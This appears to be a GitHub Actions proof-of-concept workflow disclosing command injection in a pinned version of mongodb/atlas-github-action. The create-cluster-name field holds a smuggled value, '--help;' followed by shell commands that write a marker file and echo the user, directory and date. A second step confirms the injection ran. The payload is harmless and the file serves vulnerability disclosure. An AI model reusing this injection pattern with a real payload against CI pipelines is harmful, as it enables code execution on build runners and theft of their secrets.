name: POC - Command Injection via create-cluster-name

on:
  workflow_dispatch:
  push:
    branches:
      - main

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: POC - Command Injection via create-cluster-name
        uses: mongodb/atlas-github-action@d2290a92432eaa7196e052500cb347bbe0bbffdd
        continue-on-error: true
        with:
          # Command injection via create-cluster-name
          # The injected command executes even though atlas command will fail
          # Using --help makes the command succeed, then our injected commands execute
          create-cluster-name: "--help; echo 'üö® INJECTION via create-cluster-name üö®' > /tmp/cluster-injection-poc.txt && echo 'User:' $(whoami) && echo 'PWD:' $(pwd) && echo 'Date:' $(date) >> /tmp/cluster-injection-poc.txt || true"
          tier: "M0"
          provider: "AWS"
          region: "US_EAST_1"

      - name: Verify Injection
        shell: bash
        run: |
          if [ -f /tmp/cluster-injection-poc.txt ]; then
            echo "‚úÖ VULNERABILITY CONFIRMED: Command injection via create-cluster-name successful!"
            echo ""
            echo "The injected commands executed before the atlas command failed."
          else
            echo "‚ùå Injection may have failed"
          fi
